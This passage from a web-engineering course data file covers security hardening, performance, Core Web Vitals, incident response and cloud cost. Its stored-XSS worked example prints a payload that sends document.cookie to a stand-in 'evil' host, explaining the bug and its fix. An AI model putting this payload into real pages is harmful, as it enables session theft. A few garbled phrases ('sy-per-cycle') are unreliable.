        body: `Content-Security-Policy: default-src 'self'; script-src 'self' 'nonce-{random}' (inline scripts carry the nonce; attackers cannot guess); style-src 'self' (avoid unsafe-inline; use hashes for third-party CSS); img-src 'self' data:; frame-ancestors 'none'; base-uri 'self'; form-action 'self'. Report-To/Report-URI gives violation telemetry to tune. HSTS max-age=63072000; includeSubDomains — stops downgrade forever after first visit. X-Content-Type-Options nosniff; Referrer-Policy strict-origin-when-cross-origin; Permissions-Policy camera=(), microphone=(), geolocation=(); X-Frame-Options replaced by frame-ancestors; X-XSS-Protection header is dead — rely on CSP.`,
      },
      {
        title: "Authentication and session hardening.",
        body: `Passwords: argon2id/bcrypt; rate limit login per IP+account; lockout/backoff; generic errors; MFA TOTP/WebAuthn for privileged accounts; session: HttpOnly+Secure+SameSite cookies, rotation on login/privilege change, server-side store with instant revocation, absolute+rolling expiry; logout everywhere option; refresh-token reuse detection; logout clears cookie AND server record; security questions are theater; device fingerprinting optional; alert on impossible travel.`,
      },
      {
        title: "Dependency and supply-chain defense.",
        body: `Apps are 80-90% dependencies; treat them as production code: pin via lockfiles; npm audit in CI with severity gates; overrides to force patched transitives; prefer maintained packages (release cadence, downloads, issue hygiene); avoid install scripts from unknown sources; SBOM (syft) for inventory; gitleaks in CI blocks committed secrets; Dependabot/Renovate for updates with CI validation; registry scoping (@yourco/ private) prevents dependency confusion; pin GitHub Actions by SHA, not tag.`,
      },
      {
        title: "Verification: scans, audits, and adversarial tests.",
        body: `Continuous: npm audit + lockfile check; static analysis (eslint security rules, semgrep for injection/xss patterns); dynamic: ZAP/OWASP baseline scans against staging weekly; manual: threat-model the top 5 flows per quarter (login, checkout, upload, settings, admin) with STRIDE questions; tests: authz every endpoint as wrong-tenant expecting 403/404, XSS payloads in fields, CSRF without token expecting 403; bug bounty or pentest at least yearly; findings tracked to closure like bugs — security is a backlog, not a launch-day adjective.`,
      },
    ],
    worked: [
      {
        title: "Add a strict CSP to a React app without breaking it.",
        body: `Start report-only: Content-Security-Policy-Report-Only with default-src 'none' telemetry to collect violations for a week; fix legit needs (fonts allowlist, nonce for critical inline script); then enforce: default-src 'self'; script-src 'self' 'nonce-r4ndoM' (generated per response at the edge/framework); style-src 'self' 'unsafe-inline' only if inline styles truly needed — better: move to CSS; img-src 'self' data: https:; frame-ancestors 'none'; report-uri/report-to; verify violation logs quiet for two weeks; net XSS exploitability: injected scripts now execute only if attacker controls nonce — practically dead.`,
      },
      {
        title: "Stored XSS in a comment box, end to end.",
        body: `Bug: comments render via dangerouslySetInnerHTML "to support bold markdown" — attacker posts <img src=x onerror=fetch('https://evil/?'+document.cookie)>; session theft. Fix chain: server sanitizes on write (DOMPurify-equivalent allowlist: b, i, a, code, ul; strip attributes except href with https: only); client renders sanitized output through encoder path only (drop dangerouslySetInnerHTML); CSP nonce requirement would have blocked execution anyway; existing stored payloads re-scanned and neutralized; audit similar rich-text fields (bios, notes, ticket replies); add regression test with the exact payload asserting inert render.`,
      },
      {
        title: "Audit response to a critical npm vulnerability.",
        body: `Tuesday 02:14: audit flags CVE in a transitive XML parser (critical, RCE). Response: identify reachability (is the vulnerable code path in our usage — parsing untrusted XML in one upload route, yes); apply override to patched version; CI: audit gate + test suite reruns green; deploy hotfix within the hour; rotate any secrets that flowed through the route as precaution; notify per policy; the prevention: audit gate exists precisely to pull this forward to PR time instead of an 02:14 page.`,
      },
    ],
    exam: [
      {
        question:
          "Why is SameSite=Strict/Lax not sufficient protection for session cookies?",
        answer:
          "It blocks most cross-site POSTs but not all vectors — older browsers, same-site subdomain attacks, XSS-driven forgery, or non-cookie tokens stay vulnerable; it is one wall; defense in depth keeps CSRF tokens or origin/referer checks for state-changing routes.",
      },
      {
        question:
          "What does a CSP nonce give you that allowlisting domains does not?",
        answer:
          "Cryptographic unpredictability: injected inline scripts lack the per-request nonce and die even if they slip past sanitization — allowlisting still permits any script your trusted origins ever serve, including compromised CDNs; nonce + strict script-src shrinks execution to intended bytes only.",
      },
      {
        question: "What is dependency confusion and one mitigation?",
        answer:
          "Attackers publish a public package with your internal package name but higher version; registries fetch the public one; the malicious code runs at install or runtime; mitigate by pinning to scoped @org packages, private registry config, and explicit lockfiles — never trust bare names for internals.",
      },
      {
        question:
          "In one sentence, why is output encoding the primary XSS defense even with input sanitization?",
        answer:
          "Because encoding at the exact sink (HTML attribute, element, JS string, URL, CSS) neutralizes by context with certainty, while sanitization guesses intent and fails open on unknown contexts — both layers belong in the stack, encoding first.",
      },
    ],
    cheat: [
      "Escape at output; sanitize at input for rich text; no raw innerHTML.",
      "CSP: default-src self + nonce scripts; report-only first, then enforce.",
      "HSTS, nosniff, frame-ancestors, Referrer-Policy, Permissions-Policy.",
      "Sessions: bcrypt, rate-limited login, HttpOnly+Secure+SameSite, rotate on privilege change.",
      "Lockfiles, audit gates in CI, overrides for transitives, SHA-pinned actions.",
      "Secrets: injected at runtime, never in git; rotate on suspicion; gitleaks.",
      "Verify: semgrep, ZAP baseline, wrong-tenant tests, pentest cadence.",
    ],
    recap: `Web security is uniform boring discipline, applied everywhere without exception: encode output, sanitize input, secure sessions with hardened cookies, lock down headers with CSP and HSTS, validate dependencies and rotate secrets proactively, and verify constantly with scanners, adversarial tests and audits — because attackers treat your app as one door, and you get to decide how many locks are on it.`,
    code: {
      title: "DOMPurify + encoder at the sink",
      language: "javascript",
      code: `const clean = DOMPurify.sanitize(userHtml, { ALLOWED_TAGS: ['b', 'i', 'a', 'code'] });\nreturn <div dangerouslySetInnerHTML={{ __html: clean }} />;`,
      explanation:
        "Sanitize with a narrow allowlist before the unavoidable sink; the pair is the audited, minimal exception path — everything else encodes by default.",
    },
    diagram: {
      title: "Defense-in-depth request path",
      caption: "Layers from network to handler.",
      mermaid: `flowchart LR\n T[TLS + HSTS] --> H[Headers CSP]\n H --> V[Validation authz]\n V --> S[Sanitized output]`,
    },
  },
  "web-dev-production-engineering-performance-and-scaling": {
    intro: `Performance and scaling is making software faster for real users and cheaper under load: profiling to find the real bottlenecks, caching layers, queue offloading, database tuning, load testing to find the knee, and horizontal scaling when vertical headroom runs out. The subject is the measurement-first method — instrument, profile, optimize the dominating cost, verify — because most performance work is wasted on guesses. every system is slow for the same dozen reasons; find yours, fix it once, measure forever.`,
    foundations: `Measure: APM (Datadog/New Relic) or OpenTelemetry + Grafana; CPU profiles, flamegraphs, query timings, event-loop lag. Typical culprits: N+1 queries, missing indexes, synchronous hot paths, unindexed ORDER BY, too-chatty APIs, large payloads, no caching. Caching layers: browser → CDN → app (in-memory/Redis) → DB. Queues for async work. Database: EXPLAIN ANALYZE, indexes, connection pooling (PgBouncer), N+1 elimination, read replicas. Scaling: vertical (bigger box — simple, capped), horizontal (more boxes behind LB — needs statelessness), autoscale on CPU/queue depth/latency; load test (k6) to find the saturation knee.`,
    concepts: [
      {
        title: "Find the bottleneck before optimizing.",
        body: `Flamegraphs show where CPU time actually goes (node --cpu-prof or clinic flame); APM percentiles per route identify the worst offenders; DB slow-query log + pg_stat_statements rank queries by total time; event-loop lag meters detect blocked loops; heap profiles reveal leak churn; compare against a baseline — install measurement before micro-optimizing. Rule: optimize the top line by mass — 80% of time in 1-2 paths; fix those; re-measure; stop when budget met; everything else is decoration.`,
      },
      {
        title: "Database: the usual culprit.",
        body: `N+1 → includes/eager loads or DataLoader; add composite indexes for filter+sort patterns; KILL seq scans on hot tables; connection pooling for serverless (or you exhaust max_connections at 50-100); pgbouncer transaction mode; move reports to replicas or materialized views; batch writes (unnest arrays); tune work_mem for big sorts; vacuum discipline; cache hot rows in Redis; measure query count per request in dev; in prod, pg_stat_statements top by mean × calls = where your database summer went.`,
      },
      {
        title: "Caching tiers, decided deliberately.",
        body: `Browser: Cache-Control for assets + HTML where safe; CDN edge for public/semi-dynamic (s-maxage, SWR); app-level Redis for computed entities (cache-aside, TTL, singleflight); in-process LRU for tiny hot dictionaries. What to cache: read-mostly, expensive, safe-stale — catalog pages, config, computed aggregates. Staleness budgets written down; invalidation via TTL or events; never cache private per-user data in shared tiers; hit ratios monitored; Redis sizing memory with allkeys-lru for volatile keys only — correctness keys never evicted silently.`,
      },
      {
        title: "Queues and async offloading.",
        body: `Move anything slow-off-request-path: email, image processing, report generation, webhooks — enqueue and return 202 + job id; workers scale independently; retries with backoff; DLQ; this one move routinely converts p99 tantrums into p50 mundanity. For heavy bursts, queue depth is the autoscale signal; latency-critical paths keep synchronous; everything else earns patience. Chunk giant exports into resumable jobs; progress via job status endpoint; websockets/SSE for completion notify.`,
      },
      {
        title: "Load testing to find the knee.",
        body: `k6/Locust scripts driving realistic user journeys (not synthetic ping-pong endpoints); ramp stages (50→200→800 rps) with thresholds on p95/p99 and error rate; find the saturation knee — where latency spikes superlinearly (usually connection pool exhaustion or CPU cache thrash around 60-75% utilization); scale before you hit it in prod (autoscale triggers at 60%); database is the usual first wall — fix it before autoscaling stateless tiers into it; cost per 1k requests as a first-class metric — performance and price are the same axis.`,
      },
    ],
    worked: [
      {
        title: "Audit a 2-second page and get to 200 ms.",
        body: `APM trace: 1.8 s in route — 1.3 s three sequential DB queries (N+1 on latest comments + missing index on posts.user_id + full scan on search). Fix: one include query with composite index (user_id, created_at DESC); Redis-cache the computed summary (ttl 60 s, singleflight); CDN caches the page (s-maxage 60, SWR 30) for anonymous traffic; result: 200 ms p50, 350 ms p95; DB CPU -70%; savings: zero hardware upgrades — only measurement and three decisions.`,
      },
      {
        title: "Autoscale an API before the Friday rush.",
        body: `k6 baseline: p95 240 ms at 400 rps; knee at 900 rps (latency cliff). Config: min 3 replicas, max 12; scale triggers: CPU 60% or p95 > 500 ms for 3 min; surge queue depth for worker pods; HPA behavior downscale stabilization 300 s (flap protection); pre-scale 30 min before known peaks (releases, marketing drops); result: next campaign 2,300 rps peak with p95 310 ms; zero pages; cost +8% — autoscaling paid for itself in avoided outage.`,
      },
      {
        title: "Eliminate an N+1 that only fired on admin pages.",
        body: `Admin invoice list: 1 + 2N queries; at 150 rows = 301 round trips, 6 s load — invisible to normal users, torture for support. Fix: single findMany with include items + customer select (id, name) + _count; response time 6 s → 90 ms; dev-mode query-count budget added to the test suite (any request > 10 queries fails) so N+1 never re-enters silently.`,
      },
    ],
    exam: [
      {
        question:
          'What is the correct first step when a page "feels slow" in production?',
        answer:
          "Instrument and get a trace — APM/OTel percentiles per route and the span waterfall — then attack the dominating segment (usually DB); changing code without a measurement is gambling with your weekend.",
      },
      {
        question:
          "Why is connection pooling non-optional for serverless and high-concurrency Node APIs?",
        answer:
          "Postgres creates one backend per connection; thousands of short-lived invocations each opening raw connections exhaust max_connections in seconds and degrade into fork storms; a pooler (PgBouncer transaction mode, or RDS Proxy) multiplexes clients onto a bounded set.",
      },
      {
        question: "When should work move from the request path to a queue?",
        answer:
          "When it is not required to compute the response: emails, renders, syncs, exports, third-party calls — enqueue with 202 + worker + retry/DLQ; request latency falls to the enqueue cost; correctness rises because retries no longer corrupt the response path.",
      },
      {
        question: "What does the knee of a load-test curve tell you?",
        answer:
          "The saturation point where the system passes from linear slowdown to collapse — the utilization where queueing theory turns brutal; autoscale below it, fix the bottleneck resource, and treat the knee (plus margin) as your provisioned capacity target.",
      },
    ],
    cheat: [
      "Measure first: traces, flamegraphs, query stats; fix the fat part, not the vibes.",
      "N+1 → include/join/dataloader; indexes for filter+sort; EXPLAIN ANALYZE.",
      "Connection pooling: PgBouncer transaction mode; RDS Proxy in serverless.",
      "Browser → CDN → Redis → DB; cache the shared, expensive, staleness-safe.",
      "Queue everything not needed for the response; 202 + worker + DLQ.",
      "k6 ramp tests; find the knee; autoscale below it with headroom.",
      "Cost per 1k requests is an SLO too.",
    ],
    recap: `Performance is a discipline of measurement: profile to find the dominant path — usually the database — fix indexes and N+1s, cache hot computed reads at the right tier (browser, CDN, Redis), push non-essential work behind queues, pool connections ruthlessly, and load-test to find the saturation knee so you autoscale before users feel it — every win verified by the same metrics that found the problem.`,
    code: {
      title: "pg_stat_statements top offenders",
      language: "sql",
      code: `SELECT mean_exec_time * calls AS total, mean_exec_time FROM pg_stat_statements ORDER BY total DESC LIMIT 10;`,
      explanation:
        "Ranked by cumulative time — the ten queries consuming your database; every one is a candidate for an index, a rewrite, or a cache; fix these and nobody notices performance was ever a problem.",
    },
    diagram: {
      title: "Caching pyramid",
      caption: "Closest to fastest, in order.",
      mermaid: `flowchart LR\n B[Browser cache] --> D[CDN]\n D --> R[Redis]\n R --> P[Postgres]`,
    },
  },
  "web-dev-production-engineering-core-web-vitals-and-real-user-monitoring": {
    intro: `Core Web Vitals are Google's user-centric performance metrics — LCP (loading), INP (responsiveness), CLS (stability) — and real-user monitoring turns them from lab scores into field truth you can act on. The subject is what each metric measures, how to instrument field data (CrUX, the web-vitals library, RUM), and the exact fixes that move real numbers: images, fonts, JS scheduling, and layout discipline. performance is what your slowest users actually experience, measured on their devices, not your workstation.`,
    foundations: `LCP: time to render the largest content element in viewport (good ≤ 2.5 s). INP: responsiveness to interactions — worst (or 98th-percentile) event latency across the visit, replacing FID (good ≤ 200 ms). CLS: sum of unexpected layout shift scores (good ≤ 0.1). TTFB is the server-side lead-in. Field vs lab: CrUX is real-user anonymized Chrome data (origin-level); Lighthouse is synthetic; RUM (Real User Monitoring) instruments your users via the web-vitals JS library into analytics (p75 by device, geography, page). Fixes track the metric: LCP — image size/fetch priority, CDN, caching, fonts display swap; INP — long tasks, hydration cost, main-thread work at input time; CLS — dimensions on media, no late-injected banners, reserved space for ads/embeds.`,
    concepts: [
      {
        title: "LCP: the biggest paint, deliberately fast.",
        body: `Identify the LCP element (usually hero image or h1): give it fetchpriority="high", eager loading, preconnect to its origin, responsive srcset with the right size, AVIF/WebP; serve from CDN with immutable caching; no lazy-load on the hero; CSS render-blocking pruned (critical CSS inline); server TTFB under 600 ms (edge or cache); fonts above the fold use font-display: swap + preload. LCP regressions often come from a new CMS hero image 4 MB — set a budget: hero ≤ 150 KB; monitor p75 per route; Google Search ranking uses page-level/origin scores, so every template kind must pass.`,
      },
      {
        title: "INP: responsiveness is total input journey.",
        body: `INP measures the worst interaction latency — from input to next paint: includes event processing, handler work, and render. Long JS tasks block everything; split them (scheduler.yield, time-slicing, React concurrent features), defer non-critical scripts (defer/async), code-split heavy handlers, debounce inputs, memoize expensive render paths, avoid hydration storms (client islands), and keep event handlers tiny. Chrome traces (performance panel, LoAF API — long animation frames) show the exact frames blocking input; fix the top offenders; INP is dominated by third-party scripts on marketing pages — audit them ruthlessly, lazy-load, or remove.`,
      },
      {
        title: "CLS: visual stability by reservation.",
        body: `Every element that can shift needs reserved space: width/height attributes or CSS aspect-ratio on images, videos, iframes, ads; skeleton placeholders for async content with the final height; never insert content above existing viewport content without reserving; banners fixed height (or appear at bottom); fonts that swap (fallback metrics tuned to minimize reflow — size-adjust/ascent overrides); animations from transform only. CLS attribution API pins shifts to elements — your top two offenders are usually a cookie banner and an ad slot; fix them, not "general layout".`,
      },
      {
        title: "RUM: instrumenting real users honestly.",
        body: `web-vitals library reports LCP/INP/CLS/TTFB per pageview; ship to your analytics with dimensions: route, device class, connection, geo, cohort (is returning?); dashboard p75 per route p75 — averages lie, medians hide; alert when p75 degrades > 20% day-over-day; segment by page type (blog vs app); sample 10-20% of traffic suffices; the payoff list: detect regressions pre-Google Search Console, prove fixes in field data, and report business correlation (conversion vs LCP per 100 ms buckets) — performance work becomes a forecast line, not a vibe.`,
      },
      {
        title: "The fix playbook and performance budgets.",
        body: `Budgets: hero image ≤ 150 KB; initial JS ≤ 200 KB gzip; third parties ≤ 2 origins; fonts ≤ 4 files; long tasks ≤ 2 per page. CI: Lighthouse CI blocks merges that regress; bundle-size budgets fail builds; this is how the whole org stops regressing silently. Fix cadence: measure field → rank by user impact → fix top per metric → verify in field 2 weeks out → iterate; quarterly performance review with the design team (layout shifts are design decisions); the rule: every shipped regression teaches; every prevented one is invisible wins.`,
      },
    ],
    worked: [
      {
        title: "Rescue a marketing site failing LCP.",
        body: `Field p75 LCP 4.1 s (mobile). Diagnosis: 2.8 MB hero PNG, no fetchpriority, fonts blocking with display: block, TTFB 900 ms. Fixes: hero → AVIF 118 KB responsive with fetchpriority high + preload; font-display: swap with preloaded subset; CDN edge caching for HTML with SWR (TTFB 180 ms); result: field p75 2.1 s; Search Console LCP panel flips to green in 4 weeks; conversion +6% in the A/B cohort exposed to it — the CFO attended the retro.`,
      },
      {
        title: "Fix INP on a dashboard route.",
        body: `Reports tab, INP p75 480 ms — interactions laggy. LoAF traces: hydration of a chart library (350 KB) on tab mount plus a 90 ms handler reading hidden DOM. Fixes: lazy-load the chart with Suspense skeleton; handler split with scheduler.yield; table virtualized; memoized row components; INP p75 190 ms; the route now passes on Moto G Power-class devices — the actual user device, not the developer's M3.`,
      },
      {
        title: "Zero out CLS on the blog.",
        body: `Attribution API pinned shifts to a late-loading newsletter embed (0.18) and unsized hero images. Fixes: embed gets fixed 320 px container with skeleton; all images get aspect-ratio boxes; author avatars fixed circles; verification: 28 days of post-change field data, CLS p75 0.31 → 0.02; nobody notices layout jumping anymore; the fix cost six afternoons across three templates and one embarrassed embed vendor email.`,
      },
    ],
    exam: [
      {
        question:
          "Why is INP strictly better than FID as an interaction metric?",
        answer:
          "FID measured only input delay of the first interaction; INP measures latency of all interactions (or the worst), including processing and render — the end-to-end responsiveness users feel; a page could pass FID and still feel frozen; INP closes that blind spot.",
      },
      {
        question: "What is required for a CDN to serve HTML and lower TTFB?",
        answer:
          "Public-or-semi-public cacheable responses with Cache-Control/s-maxage (or explicit purging), no per-user personalization without Vary or edge compute — and correct handling of auth responses; done right, HTML arrives from an edge 40 ms away instead of 300 ms away.",
      },
      {
        question: "Why are lab metrics (Lighthouse) insufficient alone?",
        answer:
          "Lab is one device, one network, one moment — it proves capability, not lived experience; field distributions vary by device class, geography, connection, and caching state; field p75 is the only number that matches what Google and your users see; lab guides fixes, field proves them.",
      },
      {
        question:
          "Which single attribute fixes most image-related CLS, and which fixes most LCP?",
        answer:
          'For CLS: width and height (or CSS aspect-ratio) so the box is reserved before the image arrives; for LCP: fetchpriority="high" (plus eager load and preload/preconnect) so the hero downloads before everything else on the critical path.',
      },
    ],
    cheat: [
      "LCP ≤ 2.5 s, INP ≤ 200 ms, CLS ≤ 0.1 — p75 field, not lab.",
      "LCP: hero AVIF ≤150 KB, fetchpriority, preload, CDN+SWR, swap fonts.",
      "INP: split long tasks, defer, code-split, debounce, kill third-party bloat.",
      "CLS: dimensions on all media, skeletons with final height, no surprise inserts.",
      "RUM via web-vitals to analytics; p75 per route; alert on >20% regression.",
      "Lighthouse CI + bundle budgets in pipeline; perf is a gate.",
      "Attribution APIs name the culprit element — fix that one.",
    ],
    recap: `Core Web Vitals make performance a user outcome: LCP for loading, INP for responsiveness, CLS for stability — measured in the field by RUM and CrUX, not by your laptop; the fixes are concrete (hero media discipline, long-task splitting, reserved layout), the tooling is attribution-first (which element, which frame, which third party), and the flywheel is continuous field measurement feeding budgets and CI — performance is a product behavior you can prove.`,
    code: {
      title: "Report web-vitals in one snippet",
      language: "javascript",
      code: `import { onLCP, onINP, onCLS } from 'web-vitals';\nonCLS(console.log); onINP(console.log); onLCP(console.log);`,
      explanation:
        "The library invokes callbacks with each metric as they finalize; wire to your analytics beacon with route and device context; three lines, complete field coverage.",
    },
    diagram: {
      title: "Vitals decision tree",
      caption: "Which metric hurts, which fix applies.",
      mermaid: `flowchart TD\n L[Slow load LCP] --> I[Fix images CDN TTFB]\n N[Sluggish INP] --> T[Split long tasks]\n C[Jumping CLS] --> R[Reserve space]`,
    },
  },
  "web-dev-production-engineering-incident-management-and-postmortems": {
    intro: `Incident management is the craft of bringing systems back to service fast and learning obsessively afterward: on-call rotations, severity levels, communication during fire, and blameless postmortems with tracked action items. The subject is the operational contract — how to declare, communicate, mitigate, and dissect — because outages are the tuition of operating software, and wasted tuition is optional. a good incident process turns chaos into a rehearsed procedure your whole team can execute under stress.`,
    foundations: `On-call: rotation, escalation chains, handoff docs, comp time. Severity: SEV1 (full outage/data loss — all hands), SEV2 (major degradation — active incident), SEV3 (minor — ticket it); definitions pre-agreed, not improvised. Process: detect (alerts) → declare → mitigate first, root-cause second (restore service, then learn) → communicate (status page, channels, execs) → review (blameless within 48 h) → actions tracked to completion. Metrics: MTTD (detect), MTTA (ack), MTTR (restore). Tools: PagerDuty/Opsgenie for paging; status page for customers; chat channels for war rooms; scribes during SEV1 for the timeline.`,
    concepts: [
      {
        title: "Severity levels and what each demands.",
        body: `SEV1: customer-facing total outage or data corruption — page everyone relevant, all normal work stops, status updates every 30 min, exec notification. SEV2: significant degradation (core flow down for a cohort, large error spikes) — page primary + secondary, updates hourly, workaround or rollback decision within 30 min. SEV3: minor/limited impact — ticket with staff, fix in sprint. Severity inflation (calling everything SEV2) burns people out; deflation trains apathy; calibrate in review; when in doubt, declare higher and downgrade with courage.`,
      },
      {
        title: "Mitigate first, root-cause second.",
        body: `Restore before understand: revert the suspect deploy, fail over to the replica, disable the flag, shed load, restart the wedged worker — mitigation buys time to analyze. The deploy-correlation question is asked in the first five minutes; the rollback decision should be pre-authorized for SEV1 (on-call can roll back without approval) — hesitation costs minutes of outage. Only after service is stable: logs/traces review, timeline reconstruction, cause analysis; never let learning block recovery; never let recovery replace learning.`,
      },
      {
        title: "Communication during an incident.",
        body: `War-room channel created (auto-generated by PagerDuty typically); roles: incident commander (IC — coordinates, decides, keeps timeline), operations engineer(s), scribe, communications lead (status updates). Cadence: update every 15-30 min even if "still investigating" — silence reads as abandonment; status page published within 10 min of SEV1/2 declaration; internal channel kept factual; no speculation to customers; executive summary for leadership: impact, scope, ETA for mitigation, next update time; all communications timestamped by the scribe for the postmortem.`,
      },
      {
        title: "Blameless postmortems that produce action items.",
        body: `Template: impact (who, how long, what $), timeline (times, decisions, alerts), root cause(s) (technical and human/systemic — five whys honestly applied), what went well, what went poorly, action items (owner, due date, priority, tracking in issue tracker — closed implies verified fixed). Blameless = critique systems and context, not people: "the deploy pipeline let an unreviewed config through", not "Alex broke prod". Every SEV1/2 gets one within 5 business days; shared company-wide when useful; action completion reviewed at subsequent ops reviews — postmortems without shipped fixes are literature, not engineering.`,
      },
      {
        title: "Preventing recurrence: the prevention ladder.",
        body: `Prevention ordering: (1) eliminate the class — the bug pattern deleted from existence (framework guard, lint, type); (2) detect faster — alert earlier with better signal; (3) mitigate faster — automation, runbooks, kill switches; (4) accept with policy — document known limits; monitoring adds watchdogs (synthetic checks on critical flows); error budgets and canary deploys shrink blast radius; game days drill the exact failure; chaos engineering matures the org. Track recurrence rate of the same root cause — zero is the only honest target.`,
      },
    ],
    worked: [
      {
        title: "SEV2: checkout returns 500 for 10% of users after deploy.",
        body: `14:02 alert error rate; IC declares SEV2; timeline: 14:04 rolled back the 14:00 deploy via CD pipeline (pre-authorized); errors normal by 14:09; scribe captured every decision; status page updated; postmortem next day: root cause — config flag for new currency service defaulted true in prod; why did CI miss it: config schema check existed for staging only; actions: add prod config parity test to CI (done in 2 days), canary cohorts for config-only changes (backlog), alert on partial-error-rate spikes (done); follow-ups verified closed at next ops review.`,
      },
      {
        title: "Build an on-call rotation that does not rot morale.",
        body: `Wheel: 7-day rotations primary+secondary, handoff doc updated each Sunday (open incidents, known fragile areas, planned deploys), escalation < 5 min then page next, comp time enforced, no solo deploys Friday, alert review monthly pruning non-actionable noise (we cut 60% of pages), post-incident credits for any late-night pages, rotation size ≥ 6 to keep frequency sustainable — attrition dropped, response quality up; the org stopped treating on-call as hazing.`,
      },
      {
        title: "Game day: kill the primary database replica.",
        body: `Quarterly drill: simulate RDS failover mid-load; measure: detection 25 s (synthetic monitor), promotion of replica 14 s, app reconnection storm visible (pool exhaustion — backlog item!), zero data loss; fix: connection storm retry jitter added; runbook updated; next game day moves to DNS rot and then to full-region failure; the drill reports celebrate what worked and schedule what broke — culture converts tuition into capability.`,
      },
    ],
    exam: [
      {
        question:
          "Why is mitigating before root-causing the correct incident order?",
        answer:
          "Every minute degraded is user harm and revenue loss; rolling back or failing over restores service while analysis runs afterwards — investigation is important but sequenced after safety; postmortems extract the lesson from data the mitigation preserved.",
      },
      {
        question: 'What makes a postmortem "blameless", practically?',
        answer:
          "It critiques the system — pipelines, checks, alerts, processes, context — never the person; language focuses on conditions that made the mistake possible and fixes remove those conditions; people treated as components to understand, not defendants; trust survives because punishment teaches hiding.",
      },
      {
        question:
          "Why does every page need an owner, a due date, and a verification step?",
        answer:
          'Without an owner it diffuses; without a date it drifts; without verification it is claimed-done-but-not-done — the recurring cause analysis of repeated incidents shows the same fix re-"completed" three times; closed means observed working in prod.',
      },
      {
        question: "What are the three roles minimum for a SEV1 and why?",
        answer:
          "Incident commander (decisions, coordination, pace), operations engineer(s) (hands on keyboard), scribe (timeline log and scribes the evidence) — separating deciding from typing from recording prevents tunnel vision and gives the postmortem an objective record to learn from.",
      },
    ],
    cheat: [
      "SEV1 all-hands, SEV2 paged, SEV3 ticket; declare early, downgrade freely.",
      "Mitigate first: rollback pre-authorized in SEV1; root-cause after.",
      "IC coordinates, ops fixes, scribe logs; updates every 15-30 min.",
      "Status page within 10 min; factual, timestamped, no speculation.",
      "Postmortem ≤ 5 days: impact, timeline, five whys, action items with owners.",
      "Blameless = fix systems, not people; recurrence is tracked.",
      "Drill with game days; error budgets gate risk; reviews close the loop.",
    ],
    recap: `Incident management is a rehearsed discipline: severity levels pre-agreed, mitigation before analysis, roles separated (IC, ops, scribe), communication on a cadence with a status page, and blameless postmortems whose action items actually ship and verify — because every outage teaches exactly what your system already knew, and the only question is whether your process will listen.`,
    code: {
      title: "Postmortem action-item template",
      language: "text",
      code: `items:\n  - action: Add prod config parity check to CI\n    owner: platform@\n    due: 2026-11-20\n    verify: 5 consecutive clean runs on main`,
      explanation:
        "One owner, one date, one observable verification — the triad that keeps postmortem actions from becoming decoration.",
    },
    diagram: {
      title: "Incident lifecycle",
      caption: "Detect, declare, mitigate, review.",
      mermaid: `flowchart LR\n D[Detect] --> A[Alert paged]\n A --> M[Mitigate restore]\n M --> R[Root cause review]\n R --> F[Fix + verify]`,
    },
  },
  "web-dev-production-engineering-cloud-cost-optimization": {
    intro: `Cloud cost optimization is the discipline of paying only for the capacity you use: right-sizing, autoscaling policy tuning, storage tiers, caching economics, and spot/reserved pricing — applied with measurement instead of austerity theater. The subject is the engineering method for bills: attribution, unit economics, waste hunts, and the cultural habit of treating cost as a feature you build. the cheapest cloud bill is the one you never receive — engineer for utilization, then buy the discount primitives.`,
    foundations: `Cost visibility: tags/labels per service+environment; billing export to BigQuery/cost explorer; unit metrics ($ per 1k requests, per user, per tenant). Right-sizing: CPU/memory utilization p90 targets, downsizing overprovisioned; autoscaling parameters (min, max, triggers, stabilization) tuned to actual traffic curves; storage lifecycle (hot → infrequent → archive), object storage vs block; caching reduces origin spend; reserved instances/savings plans for steady baseline; spot/preemptible for interruptible batch (CI, transcoding). Kill the zombies: idle load balancers, unattached volumes, unused NAT gateways, dev instances running weekends.`,
    concepts: [
      {
        title: "Attribution and unit economics first.",
        body: `You cannot optimize what you cannot attribute: enforce tags (service, team, env, cost-center) at deploy; billing export joined with tags → per-service daily spend dashboard; define unit metrics per product ($/active user, $/1k searches); share with product — price/feature decisions get a cost dimension; anomaly alerts on daily spend > threshold vs baseline (30-day rolling); monthly cost review as standing agenda; engineers see their service bill monthly — visibility changes behavior cheaper than any mandate.`,
      },
      {
        title: "Right-sizing and autoscaling policy.",
        body: `Baseline p90 CPU < 40% across the fleet signals headroom to shrink; memory request/limit ratios; JVM/Node heap sizing; scale on multiple signals (CPU + queue depth + latency) not CPU alone; min instances = floor of steady traffic, not comfort; max = ceiling proven by load tests; downscale cool-down tuned to avoid thrash; database instance classes fit the actual working set; read replicas for analytics offload replaced with OLAP sync instead of bigger primary; the wins: 30-50% compute savings with identical SLOs — measured, never guessed.`,
      },
      {
        title: "Storage and data transfer economics.",
        body: `Storage tiers: S3 standard vs infrequent vs Glacier by access age (lifecycle rules automate); block volumes unattached orphan hunts monthly; snapshots expired; logs retention tiered (hot 14 days, cold to archive after); egress is often the hidden giant — CDN front of everything cacheable, compress payloads, regional affinity for data gravity, private links avoid NAT cross-zone fees; inter-AZ traffic patterns audited; image sizes (container pull egress) trimmed by multi-stage builds — a 180 MB layer pulled 100 times a day is 18 GB/day of quiet spend.`,
      },
      {
        title: "Discount primitives: reservations, spot, commitments.",
        body: `Compute savings plans / reserved instances: 30-60% off for 1-3 year commitments on steady baseline — buy only baseline verified by 90-day data, never for spiky capacity; spot/preemptible for interruptible batch: CI runners, media transcoding, ML training checkpoints — 60-80% off with graceful interruption handling (drain, checkpoint, retry); committed use discounts for DB/RDS; savings plans require monthly coverage review; over-committing wastes more than under-committing; start with 50% of steady-state commitment, grow with data.`,
      },
      {
        title: "Caching and efficiency as cost reduction.",
        body: `Every cache hit is origin compute unpaid: CDN offload, Redis hits, ETag 304s, query-result caches — measure hit ratios monthly and price them. Efficiency: batch writes, eliminate N+1 (a 301-query request costs real milliseconds at sy-per-cycle), pagination instead of unbounded list endpoints, compression (brotli), payload diet (fields, not *); queue offload avoids over-provisioning for rare peaks; serverless for spiky workloads stops idle spend; the cheapest optimization ever: deleting zombies and unneeded features — unused code paths still cost provisioned capacity.`,
      },
    ],
    worked: [
      {
        title: "Find and kill 35% of a monthly cloud bill.",
        body: `Week one: tag enforcement + export to BigQuery; report: NAT gateway $900/mo idle-ish, 3 unattached 2 TB volumes ($300), dev RDS always-on ($380), oversize m5.2xlarge workers (p90 CPU 18%) → m5.xlarge (-50%), CDN missing on marketing site (egress hotspot). Savings: $1,860/mo without touching prod capacity; new dashboard per service; monthly review stood up; the CFO forwarded the graph with the caption: engineering pays rent now, on purpose.`,
      },
      {
        title: "Autoscale to the actual traffic curve.",
